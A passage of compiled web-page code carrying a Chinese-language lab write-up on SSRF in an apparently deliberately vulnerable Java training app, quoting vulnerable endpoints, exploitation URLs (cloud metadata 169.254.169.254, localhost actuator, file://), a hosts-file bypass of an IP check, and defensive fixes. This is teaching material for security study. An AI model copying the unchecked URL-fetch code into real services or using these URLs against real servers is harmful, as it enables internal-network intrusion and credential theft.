`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[113]||=i(`figure`,null,[i(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272017990.png`,alt:`image-20250527201721864`,loading:`lazy`,decoding:`async`})],-1),s[114]||=i(`h3`,{id:`ssrf`,tabindex:`-1`},[r(`SSRF `),i(`a`,{class:`header-anchor`,href:`#ssrf`,"aria-label":`Permalink to "SSRF"`},`​`)],-1),s[115]||=i(`h4`,{id:`_1-ssrf-urlconnection-vuln`,tabindex:`-1`},[r(`1./ssrf/urlConnection/vuln `),i(`a`,{class:`header-anchor`,href:`#_1-ssrf-urlconnection-vuln`,"aria-label":`Permalink to "1./ssrf/urlConnection/vuln"`},`​`)],-1),s[116]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`    @RequestMapping(value = "/urlConnection/vuln", method = {RequestMethod.POST, RequestMethod.GET})
    public String URLConnectionVuln(String url) {
        return HttpUtils.URLConnection(url);
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[117]||=i(`p`,null,`我们来看URLConnection`,-1),s[118]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`    public static String URLConnection(String url) {
        try {
            URL u = new URL(url);
            URLConnection urlConnection = u.openConnection();
            BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream())); //send request
            String inputLine;
            StringBuilder html = new StringBuilder();

            while ((inputLine = in.readLine()) != null) {
                html.append(inputLine);
            }
            in.close();
            return html.toString();
        } catch (Exception e) {
            logger.error(e.getMessage());
            return e.getMessage();
        }
    }
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[119]||=i(`p`,null,`这里我们可以用文件读取协议file://实现访问`,-1),s[120]||=i(`figure`,null,[i(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272053224.png`,alt:`image-20250527205331156`,loading:`lazy`,decoding:`async`})],-1),s[121]||=i(`h4`,{id:`_2-ssrf-httpurlconnection-vuln`,tabindex:`-1`},[r(`2./ssrf/HttpURLConnection/vuln `),i(`a`,{class:`header-anchor`,href:`#_2-ssrf-httpurlconnection-vuln`,"aria-label":`Permalink to "2./ssrf/HttpURLConnection/vuln"`},`​`)],-1),s[122]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`    @GetMapping("/HttpURLConnection/vuln")
    public String httpURLConnectionVuln(@RequestParam String url) {
        return HttpUtils.HttpURLConnection(url);
    }
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[123]||=i(`p`,null,`我们来看HttpURLConnection`,-1),s[124]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`    public static String HttpURLConnection(String url) {
        try {
            URL u = new URL(url);
            URLConnection urlConnection = u.openConnection();
            HttpURLConnection conn = (HttpURLConnection) urlConnection;
//             conn.setInstanceFollowRedirects(false);
//             Many HttpURLConnection methods can send http request, such as getResponseCode, getHeaderField
            InputStream is = conn.getInputStream();  // send request
            BufferedReader in = new BufferedReader(new InputStreamReader(is));
            String inputLine;
            StringBuilder html = new StringBuilder();

            while ((inputLine = in.readLine()) != null) {
                html.append(inputLine);
            }
            in.close();
            return html.toString();
        } catch (IOException e) {
            logger.error(e.getMessage());
            return e.getMessage();
        }
    }
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[125]||=i(`p`,null,`这里用HttpURLConnection做了强转，限制只能用http/htps协议，但可以访问内网其他主机`,-1),s[126]||=i(`figure`,null,[i(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272105083.png`,alt:`image-20250527210533999`,loading:`lazy`,decoding:`async`})],-1),s[127]||=i(`p`,null,`访问到了首页`,-1),s[128]||=i(`h4`,{id:`_3-ssrf-openstream`,tabindex:`-1`},[r(`3./ssrf/openStream `),i(`a`,{class:`header-anchor`,href:`#_3-ssrf-openstream`,"aria-label":`Permalink to "3./ssrf/openStream"`},`​`)],-1),s[129]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`    @GetMapping("/openStream")
    public void openStream(@RequestParam String url, HttpServletResponse response) throws IOException {
        InputStream inputStream = null;
        OutputStream outputStream = null;
        try {
            String downLoadImgFileName = WebUtils.getNameWithoutExtension(url) + "." + WebUtils.getFileExtension(url);
            // download
            response.setHeader("content-disposition", "attachment;fileName=" + downLoadImgFileName);

            URL u = new URL(url);
            int length;
            byte[] bytes = new byte[1024];
            inputStream = u.openStream(); // send request
            outputStream = response.getOutputStream();
            while ((length = inputStream.read(bytes)) > 0) {
                outputStream.write(bytes, 0, length);
            }

        } catch (Exception e) {
            logger.error(e.toString());
        } finally {
            if (inputStream != null) {
                inputStream.close();
            }
            if (outputStream != null) {
                outputStream.close();
            }
        }
    }
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[130]||=i(`p`,null,`可以通过这个路由实现任意文件下载：`,-1),s[131]||=i(`figure`,null,[i(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272132329.png`,alt:`image-20250527213236260`,loading:`lazy`,decoding:`async`})],-1),s[132]||=i(`h4`,{id:`_4-ssrf-httpsyncclients-vuln`,tabindex:`-1`},[r(`4./ssrf/HttpSyncClients/vuln `),i(`a`,{class:`header-anchor`,href:`#_4-ssrf-httpsyncclients-vuln`,"aria-label":`Permalink to "4./ssrf/HttpSyncClients/vuln"`},`​`)],-1),s[133]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},` @GetMapping("/HttpSyncClients/vuln")
    public String HttpSyncClients(@RequestParam("url") String url) {
        return HttpUtils.HttpAsyncClients(url);
    }
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[134]||=i(`p`,null,`我们来看HttpAsyncClients`,-1),s[135]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`    public static String HttpAsyncClients(String url) {
        CloseableHttpAsyncClient httpclient = HttpAsyncClients.createDefault();
        try {
            httpclient.start();
            final HttpGet request = new HttpGet(url);
            Future<HttpResponse> future = httpclient.execute(request, null);
            HttpResponse response = future.get(6000, TimeUnit.MILLISECONDS);
            return EntityUtils.toString(response.getEntity());
        } catch (Exception e) {
            return e.getMessage();
        } finally {
            try {
                httpclient.close();
            } catch (Exception e) {
                logger.error(e.getMessage());
            }
        }
    }
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[136]||=i(`p`,null,`我们发现没有对url进行检查，所以可以使用ssrf`,-1),s[137]||=i(`figure`,null,[i(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272138857.png`,alt:`image-20250527213854753`,loading:`lazy`,decoding:`async`})],-1),s[138]||=i(`h4`,{id:`_5-ssrf-resttemplate-vuln1`,tabindex:`-1`},[r(`5./ssrf/restTemplate/vuln1 `),i(`a`,{class:`header-anchor`,href:`#_5-ssrf-resttemplate-vuln1`,"aria-label":`Permalink to "5./ssrf/restTemplate/vuln1"`},`​`)],-1),s[139]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`    @GetMapping("/restTemplate/vuln1")
    public String RestTemplateUrlBanRedirects(String url){
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_JSON_UTF8);
        return httpService.RequestHttpBanRedirects(url, headers);
    }
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[140]||=i(`p`,null,[r(`这段代码使用 `),i(`strong`,null,`Spring RestTemplate`),r(` 来进行 HTTP 请求，并禁止了重定向，但不影响直接访问`)],-1),s[141]||=i(`p`,null,`注：为什么需要加个/login`,-1),s[142]||=i(`p`,null,[r(`因为`),i(`a`,{href:`http://60.205.158.87:8080/%E4%BC%9A%E9%BB%98%E8%AE%A4%E8%B7%B3%E8%BD%AC%E5%88%B0/login%EF%BC%8C%E8%80%8C%E4%BB%A3%E7%A0%81%E7%A6%81%E6%AD%A2%E4%BA%86%E9%87%8D%E5%AE%9A%E5%90%91`,target:`_blank`,rel:`noreferrer`},`http://60.205.158.87:8080/会默认跳转到/login，而代码禁止了重定向`)],-1),s[143]||=i(`figure`,null,[i(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272146502.png`,alt:`image-20250527214625396`,loading:`lazy`,decoding:`async`})],-1),s[144]||=i(`p`,null,`既然已经禁止了重定向（Redirect），为什么 SSRF 仍然可能发生？`,-1),s[145]||=i(`hr`,null,null,-1),s[146]||=i(`p`,null,`一、什么是 SSRF？`,-1),s[147]||=i(`p`,null,[i(`strong`,null,`SSRF（Server-Side Request Forgery）`),r(`，即服务器端请求伪造。攻击者控制一个参数，让服务器主动去访问一个由他指定的 URL，从而达到探测内网、打数据库、访问云元数据服务（如 AWS 的 `),i(`code`,null,`169.254.169.254`),r(`）等目的。`)],-1),s[148]||=i(`p`,null,[i(`strong`,null,`核心问题：不是重定向，而是“服务器能不能发出请求”。`)],-1),s[149]||=i(`hr`,null,null,-1),s[150]||=i(`p`,null,`二、禁止重定向 vs SSRF 的区别`,-1),s[151]||=i(`p`,null,[r(`你禁止的是 `),i(`strong`,null,`HTTP 3xx 重定向`),r(`，比如：`)],-1),s[152]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`用户访问 http://example.com => 返回 302 Location: http://malicious.com/internal
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[153]||=i(`p`,null,[r(`这时候如果自动跟随重定向，就会去访问 `),i(`code`,null,`http://malicious.com/internal`),r(`。禁用重定向只防止了这种 `),i(`strong`,null,`间接跳转 SSRF`),r(`。`)],-1),s[154]||=i(`p`,null,[r(`✅ `),i(`strong`,null,`禁止重定向确实防止了这种“跳转型 SSRF”。`)],-1),s[155]||=i(`hr`,null,null,-1),s[156]||=i(`p`,null,[r(`但是，`),i(`strong`,null,`普通 SSRF 根本不依赖重定向！`)],-1),s[157]||=i(`p`,null,`比如你直接访问这个地址：`,-1),s[158]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`http://127.0.0.1:3306/
http://169.254.169.254/latest/meta-data/
http://localhost:8080/actuator/env
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[159]||=i(`p`,null,[r(`这些 URL `),i(`strong`,null,`根本不会返回 3xx 重定向`),r(`，它们是直接请求目标服务，获取响应。`)],-1),s[160]||=i(`p`,null,`在你当前的代码中：`,-1),s[161]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`httpService.RequestHttpBanRedirects(url, headers);
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[162]||=i(`p`,null,`如果攻击者传的就是一个直连目标，比如：`,-1),s[163]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`?url=http://127.0.0.1:8080/
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[164]||=i(`p`,null,[r(`你不管重定向不重定向，`),i(`strong`,null,`请求都会直接发出去`),r(`，SSRF 就发生了。`)],-1),s[165]||=i(`h4`,{id:`_6-ssrf-resttemplate-vuln2`,tabindex:`-1`},[r(`6./ssrf/restTemplate/vuln2 `),i(`a`,{class:`header-anchor`,href:`#_6-ssrf-resttemplate-vuln2`,"aria-label":`Permalink to "6./ssrf/restTemplate/vuln2"`},`​`)],-1),s[166]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`   @GetMapping("/restTemplate/vuln2")
    public String RestTemplateUrl(String url){
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_JSON_UTF8);
        return httpService.RequestHttp(url, headers);
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[167]||=i(`p`,null,`这串代码没有禁止重定向，我们可以直接SSRF`,-1),s[168]||=i(`figure`,null,[i(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505281929552.png`,alt:`image-20250528192945371`,loading:`lazy`,decoding:`async`})],-1),s[169]||=i(`h4`,{id:`_7-ssrf-hutool-vuln`,tabindex:`-1`},[r(`7./ssrf/hutool/vuln `),i(`a`,{class:`header-anchor`,href:`#_7-ssrf-hutool-vuln`,"aria-label":`Permalink to "7./ssrf/hutool/vuln"`},`​`)],-1),s[170]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`@GetMapping("/hutool/vuln")
public String hutoolHttp(String url){
    return HttpUtil.get(url);
}

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[171]||=i(`p`,null,`这个库也能ssrf，但禁止了重定向`,-1),s[172]||=i(`figure`,null,[i(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505281948518.png`,alt:`image-20250528194858386`,loading:`lazy`,decoding:`async`})],-1),s[173]||=i(`p`,null,`8./ssrf/denrebind/vuln`,-1),s[174]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`@GetMapping("/dnsrebind/vuln")
public String DnsRebind(String url) {
    java.security.Security.setProperty("networkaddress.cache.negative.ttl" , "0");
    if (!SecurityUtil.checkSSRFWithoutRedirect(url)) {
        return "Dangerous url";
    }
    return HttpUtil.get(url);
}

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[175]||=i(`p`,null,`来看checkSSRFWithoutRedirect`,-1),s[176]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},` /**
     * 不能使用白名单的情况下建议使用该方案。前提是禁用重定向并且TTL默认不为0。
     * 存在问题：
     *  1、TTL为0会被绕过
     *  2、使用重定向可绕过
     *
     * @param url The url that needs to check.
     * @return Safe url returns true. Dangerous url returns false.
     */
    public static boolean checkSSRFWithoutRedirect(String url) {
        if(url == null) {
            return false;
        }
        return !SSRFChecker.isInternalIpByUrl(url);
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[177]||=i(`p`,null,`来看isInternalIpByUrl函数`,-1),s[178]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`public static boolean isInternalIpByUrl(String url) {

        String host = url2host(url);
        if (host.equals("")) {
            return true; // 异常URL当成内网IP等非法URL处理
        }

        String ip = host2ip(host);
        if (ip.equals("")) {
            return true; // 如果域名转换为IP异常，则认为是非法URL
        }

        return isInternalIp(ip);
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[179]||=i(`p`,null,`添加了IP检查，修改一下dns解析即可绕过，方法如下：`,-1),s[180]||=i(`p`,null,`给本地的hosts文件添加一条解析记录：`,-1),s[181]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`192.168.1.43 www.baidu.com
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[182]||=i(`h4`,{id:`_8-ssrf-dnsrebind-vuln`,tabindex:`-1`},[r(`8./ssrf/dnsrebind/vuln `),i(`a`,{class:`header-anchor`,href:`#_8-ssrf-dnsrebind-vuln`,"aria-label":`Permalink to "8./ssrf/dnsrebind/vuln"`},`​`)],-1),s[183]||=i(`p`,null,`漏洞代码`,-1),s[184]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`@GetMapping("/dnsrebind/vuln")
public String DnsRebind(String url) {
    java.security.Security.setProperty("networkaddress.cache.negative.ttl" , "0");
    if (!SecurityUtil.checkSSRFWithoutRedirect(url)) {
        return "Dangerous url";
    }
    return HttpUtil.get(url);
}

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[185]||=i(`p`,null,`我们来看checkSSRFWithoutRedirect函数`,-1),s[186]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},` /**
     * 不能使用白名单的情况下建议使用该方案。前提是禁用重定向并且TTL默认不为0。
     * 存在问题：
     *  1、TTL为0会被绕过
     *  2、使用重定向可绕过
     *
     * @param url The url that needs to check.
     * @return Safe url returns true. Dangerous url returns false.
     */
    public static boolean checkSSRFWithoutRedirect(String url) {
        if(url == null) {
            return false;
        }
        return !SSRFChecker.isInternalIpByUrl(url);
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[187]||=i(`p`,null,[i(`code`,null,`isInternalIpByUrl`),r(`函数：`)],-1),s[188]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`public static boolean isInternalIpByUrl(String url) {

        String host = url2host(url);
        if (host.equals("")) {
            return true; // 异常URL当成内网IP等非法URL处理
        }

        String ip = host2ip(host);
        if (ip.equals("")) {
            return true; // 如果域名转换为IP异常，则认为是非法URL
        }

        return isInternalIp(ip);
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[189]||=i(`p`,null,`添加了IP检查，修改一下dns解析即可绕过，方法如下：`,-1),s[190]||=i(`p`,null,`给本地的hosts文件添加一条解析记录：`,-1),s[191]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`192.168.1.43 www.baidu.com
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[192]||=i(`p`,null,`然后就可以实现ssrf`,-1),s[193]||=i(`h4`,{id:`ssrf的修复与防护`,tabindex:`-1`},[r(`ssrf的修复与防护 `),i(`a`,{class:`header-anchor`,href:`#ssrf的修复与防护`,"aria-label":`Permalink to "ssrf的修复与防护"`},`​`)],-1),s[194]||=i(`p`,null,`（1）限制协议使用`,-1),s[195]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`    @GetMapping("/urlConnection/sec")
    public String URLConnectionSec(String url) {

        // Decline not http/https protocol
        if (!SecurityUtil.isHttp(url)) {
            return "[-] SSRF check failed";
        }

        try {
            SecurityUtil.startSSRFHook();
            return HttpUtils.URLConnection(url);
        } catch (SSRFException | IOException e) {
            return e.getMessage();
        } finally {
            SecurityUtil.stopSSRFHook();
        }

    }
`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[196]||=i(`p`,null,`isHttp函数`,-1),s[197]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},` public static boolean isHttp(String url) {
        return url.startsWith("http://") || url.startsWith("https://");
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[198]||=i(`p`,null,[r(`会检查 `),i(`code`,null,`url`),r(` 是否是 `),i(`code`,null,`http://`),r(` 或 `),i(`code`,null,`https://`),r(` 协议，如果不是则直接返回 `),i(`code`,null,`"[-] SSRF check failed"`),r(`，防止 `),i(`code`,null,`file://`),r(`、`),i(`code`,null,`ftp://`),r(`、`),i(`code`,null,`gopher://`),r(` 等协议的 SSRF 利用`)],-1),s[199]||=i(`figure`,null,[i(`img`,{src:`https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507240850408.png`,alt:`image-20250724085008108`,loading:`lazy`,decoding:`async`})],-1),s[200]||=i(`p`,null,`（2）限制文件访问`,-1),s[201]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`   @GetMapping("/ImageIO/sec")
    public String ImageIO(@RequestParam String url) {
        try {
            SecurityUtil.startSSRFHook();
            HttpUtils.imageIO(url);
        } catch (SSRFException | IOException e) {
            return e.getMessage();
        } finally {
            SecurityUtil.stopSSRFHook();
        }

        return "ImageIO ssrf test";
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[202]||=i(`p`,null,[i(`code`,null,`imageIO`),r(`函数：`)],-1),s[203]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`public static void imageIO(String url) {
        try {
            URL u = new URL(url);
            ImageIO.read(u); // send request
        } catch (IOException e) {
            logger.error(e.getMessage());
        }

    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[204]||=i(`p`,null,`（3）http请求检查`,-1),s[205]||=i(`p`,null,`方法1：`,-1),s[206]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`    @GetMapping("/okhttp/sec")
    public String okhttp(@RequestParam String url) {

        try {
            SecurityUtil.startSSRFHook();
            return HttpUtils.okhttp(url);
        } catch (SSRFException | IOException e) {
            return e.getMessage();
        } finally {
            SecurityUtil.stopSSRFHook();
        }

    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[207]||=i(`p`,null,[i(`code`,null,`okhttp`),r(`函数：`)],-1),s[208]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`public static String okhttp(String url) throws IOException {
    OkHttpClient client = new OkHttpClient();
    com.squareup.okhttp.Request ok_http = new com.squareup.okhttp.Request.Builder().url(url).build();
    return client.newCall(ok_http).execute().body().string();
}

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[209]||=i(`p`,null,`方法2：`,-1),s[210]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},` @GetMapping("/httpclient/sec")
    public String HttpClient(@RequestParam String url) {

        try {
            SecurityUtil.startSSRFHook();
            return HttpUtils.httpClient(url);
        } catch (SSRFException | IOException e) {
            return e.getMessage();
        } finally {
            SecurityUtil.stopSSRFHook();
        }

    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[211]||=i(`p`,null,[i(`code`,null,`httpClient`),r(`函数：`)],-1),s[212]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`public static String httpClient(String url) {

        StringBuilder result = new StringBuilder();

        try {

            CloseableHttpClient client = HttpClients.createDefault();
            HttpGet httpGet = new HttpGet(url);
            // set redirect enable false
            // httpGet.setConfig(RequestConfig.custom().setRedirectsEnabled(false).build());
            HttpResponse httpResponse = client.execute(httpGet); // send request
            BufferedReader rd = new BufferedReader(new InputStreamReader(httpResponse.getEntity().getContent()));

            String line;
            while ((line = rd.readLine()) != null) {
                result.append(line);
            }

            return result.toString();

        } catch (Exception e) {
            return e.getMessage();
        }
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[213]||=i(`p`,null,`方法3：`,-1),s[214]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`@GetMapping("/commonsHttpClient/sec")
public String commonsHttpClient(@RequestParam String url) {

    try {
        SecurityUtil.startSSRFHook();
        return HttpUtils.commonHttpClient(url);
    } catch (SSRFException | IOException e) {
        return e.getMessage();
    } finally {
        SecurityUtil.stopSSRFHook();
    }

}

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[215]||=i(`p`,null,[i(`code`,null,`commonHttpClient`),r(`函数：`)],-1),s[216]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`    public static String commonHttpClient(String url) {

        HttpClient client = new HttpClient();
        GetMethod method = new GetMethod(url);

        try {
            client.executeMethod(method); // send request
            byte[] resBody = method.getResponseBody();
            return new String(resBody);

        } catch (IOException e) {
            return "Error: " + e.getMessage();
        } finally {
            // Release the connection.
            method.releaseConnection();
        }
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[217]||=i(`p`,null,`方法4：`,-1),s[218]||=i(`div`,{class:`language-`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`}),i(`pre`,null,[i(`code`,null,`    @GetMapping("/Jsoup/sec")
    public String Jsoup(@RequestParam String url) {

        try {
            SecurityUtil.startSSRFHook();
            return HttpUtils.Jsoup(url);
        } catch (SSRFException | IOException e) {
            return e.getMessage();
        } finally {
            SecurityUtil.stopSSRFHook();
        }

    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[219]||=i(`p`,null,`Jsoup函数`,-1),s[220]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`   public static String Jsoup(String url) {
        try {
            Document doc = Jsoup.connect(url)
//                    .followRedirects(false)
                    .timeout(3000)
                    .cookie("name", "joychou") // request cookies
                    .execute().parse();
            return doc.outerHtml();
        } catch (IOException e) {
            return e.getMessage();
        }
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[221]||=i(`p`,null,`方法5：`,-1),s[222]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`  @GetMapping("/IOUtils/sec")
    public String IOUtils(String url) {
        try {
            SecurityUtil.startSSRFHook();
            HttpUtils.IOUtils(url);
        } catch (SSRFException | IOException e) {
            return e.getMessage();
        } finally {
            SecurityUtil.stopSSRFHook();
        }

        return "IOUtils ssrf test";
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[223]||=i(`p`,null,[i(`code`,null,`IOUtils`),r(`函数`)],-1),s[224]||=i(`div`,{class:`language-java`},[i(`button`,{title:`Copy code`,class:`copy`}),i(`span`,{class:`lang`},`java`),i(`pre`,null,[i(`code`,{class:`language-java`},`  public static void IOUtils(String url) {
        try {
            IOUtils.toByteArray(URI.create(url));
        } catch (IOException e) {
            logger.error(e.getMessage());
        }
    }

`)]),i(`button`,{class:`code-block-unfold-btn`})],-1),s[225]||=i(`table`,null,[i(`thead`,null,[i(`tr`,null,[i(`th`,null,`特性/框架`),i(`th`,null,[i(`strong`,null,`OkHttp`)]),i(`th`,null,[i(`strong`,null,`Apache HttpClient 4.x`)]),i(`th`,null,[i(`strong`,null,`Commons HttpClient 3.x`)]),i(`th`,null,[i(`strong`,null,`Jsoup`)]),i(`th`,null,[i(`strong`,null,`IOUtils + URLConnection`)])])]),i(`tbody`,null,[i(`tr`,null,[i(`td`,null,[i(`strong`,null,`主要定位`)]),i(`td`,null,`现代高性能 HTTP 客户端`),i(`td`,null,`企业常用 HTTP 客户端`),i(`td`,null,`老版本 HTTP 客户端（已废弃）`),i(`td`,null,`网页抓取 + HTML 解析`),i(`td`,null,`简单流读取工具`)]),i(`tr`,null,[i(`td`,null,[i(`strong`,null,`支持协议`)]),i(`td`,null,`HTTP/HTTPS（默认拒绝 file://）`),i(`td`,null,`HTTP/HTTPS（默认拒绝 file://）`),i(`td`,null,`HTTP/HTTPS（部分场景支持 file://）`),i(`td`,null,`HTTP/HTTPS/FILE`),i(`td`,null,`HTTP/HTTPS/FILE/GOPHER 等`)]),i(`tr`,null,[i(`td`,null,[i(`strong`,null,`是否跟随重定向`)]),i(`td`,null,`✅ 默认跟随，可禁用`),i(`td`,null,`✅ 默认跟随，可禁用`),i(`td`,null,`✅ 默认跟随，可禁用`),i(`td`,null,`✅ 默认跟随`),i(`td`,null,`✅ 默认跟随`)]),i(`tr`,null,[i(`td`,null,[i(`strong`,null,`连接池`)]),i(`td`,null,`✅ 内置复用连接池`),i(`td`,null,`✅ 可配置连接池`),i(`td`,null,`❌ 无`),i(`td`,null,`❌ 无`),i(`td`,null,`❌ 每次新建连接`)]),i(`tr`,null,[i(`td`,null,[i(`strong`,null,`超时设置`)]),i(`td`,null,`✅ 支持连接/读超时`),i(`td`,null,`✅ 支持连接/读超时`),i(`td`,null,`❌ 配置复杂，易忽略`),i(`td`,null,`✅ 可配置超时`),i(`td`,null,`❌ 